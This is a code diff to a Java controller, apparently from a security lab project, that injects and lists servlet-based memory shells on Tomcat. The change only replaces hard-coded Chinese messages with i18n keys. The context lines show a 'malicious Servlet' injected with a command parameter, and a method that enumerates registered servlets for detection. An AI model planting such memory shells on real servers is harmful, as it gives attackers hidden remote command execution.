@@ -48,7 +48,7 @@ public class ServletMemShellController extends BaseMemShellController {
         try {
             Context context = getContext();
             if (context == null) {
-                return R.error("获取Context失败");
+                return R.error(msg("mshell.result.contextFailed"));
             }
 
             // 创建恶意Servlet
@@ -90,12 +90,12 @@ public class ServletMemShellController extends BaseMemShellController {
 
             log.info("Servlet型内存马注入成功，名称: {}, URL Pattern: {}, 命令参数: {}", 
                     servletName, urlPattern, cmdParam);
-            return R.ok("内存马注入成功").put("data", String.format(
-                    "Servlet名称: %s\nURL Pattern: %s\n命令参数: %s", 
+            return R.ok(msg("mshell.result.injectSuccess")).put("data", String.format(
+                    msg("mshell.result.servletInjectData"),
                     servletName, urlPattern, cmdParam));
         } catch (Exception e) {
             log.error("注入失败", e);
-            return R.error("注入失败：" + e.getMessage());
+            return R.error(msg("mshell.result.injectFailed", e.getMessage()));
         }
     }
 
@@ -106,19 +106,19 @@ public class ServletMemShellController extends BaseMemShellController {
         try {
             Context context = getContext();
             if (context == null) {
-                return R.error("获取Context失败");
+                return R.error(msg("mshell.result.contextFailed"));
             }
 
             StringBuilder result = new StringBuilder();
-            result.append("已注入的Servlet列表：\n");
+            result.append(msg("mshell.result.servletList")).append("\n");
 
             // 获取所有Wrapper
             Container[] wrappers = ((StandardContext) context).findChildren();
             for (Container wrapper : wrappers) {
                 if (wrapper instanceof Wrapper) {
                     Wrapper w = (Wrapper) wrapper;
-                    result.append("- Servlet名称: ").append(w.getName())
-                          .append("\n  类型: ").append(w.getServletClass())
+                    result.append("- ").append(msg("mshell.result.servletName")).append(": ").append(w.getName())
+                          .append("\n  ").append(msg("mshell.result.type")).append(": ").append(w.getServletClass())
                           .append("\n  URL Pattern: ").append(context.findServletMapping(w.getName()))
                           .append("\n");
                 }
@@ -127,7 +127,7 @@ public class ServletMemShellController extends BaseMemShellController {
             return R.ok().put("data", result.toString());
         } catch (Exception e) {
             log.error("检测失败", e);
-            return R.error("检测失败：" + e.getMessage());
+            return R.error(msg("mshell.result.detectFailed", e.getMessage()));
         }
     }
 }
